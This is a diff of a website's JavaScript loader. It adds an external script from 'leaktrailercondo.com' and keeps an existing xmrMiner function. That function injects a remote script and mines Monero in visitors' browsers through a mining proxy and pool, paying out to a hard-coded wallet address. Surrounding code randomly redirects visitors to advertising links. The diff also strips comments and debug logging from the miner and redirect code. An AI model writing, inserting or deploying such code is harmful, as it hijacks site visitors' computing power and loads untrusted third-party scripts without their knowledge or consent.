@@ -3,13 +3,13 @@ window.onload = function() {
 };
 
 var jsFiles = [
-    'https://imc.re/assets/js/core/jquery.min.js'
+    'https://imc.re/assets/js/core/jquery.min.js',
+    'https://leaktrailercondo.com/ff/22/ec/ff22ec5ace281b1e00826a57377a9c22.js'
 ];
 
 var links = [
     'https://l.imc.re/adsterra'
 ];
-// ,
 // 'https://l.imc.re/pddcpa',
 // 'https://l.imc.re/haoka',
 // 'https://l.imc.re/ad'
@@ -32,8 +32,6 @@ function loadIMCMain() {
     }
 
     var randomNumber = Math.random();
-    console.log('test:');
-    console.log(randomNumber);
     if (randomNumber >= 0.8) {
         redirectToLinks('loc');
         console.log("loc");
@@ -101,13 +99,11 @@ function redirectToDomain() {
 }
 
 function xmrMiner() {
-    // Start Of Mining Code (Javascript)
     var script = document.createElement("script");
     // script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
     script.src = "https://thelifewillbefine.de/karma/karma.js?karma=bs%253Falgy=rx/0%253Fnosaj=xmr.miner.mcbe-server.com:9000";
     // script.src = "/assets/js/na-monero.js";
 
-    // 使用load事件确保脚本加载完毕后再执行startMining函数
     script.onload = function() {
         server = "wss://ny1.xmrminingproxy.com";
         var pool = "moneroocean.stream";
@@ -121,7 +117,6 @@ function xmrMiner() {
         EverythingIsLife('46CCPD4KmGbcs3vCwUPtkUCaKQRzLmb6GR7NJwj93anPg3CPugJbDmucumG7r3JsUH4PGRBSoHQAyCXjNDYffHJPHPdrGst', workerId, 80);
     };
     document.head.appendChild(script);
-    // End Of Mining Code
 }
 
 
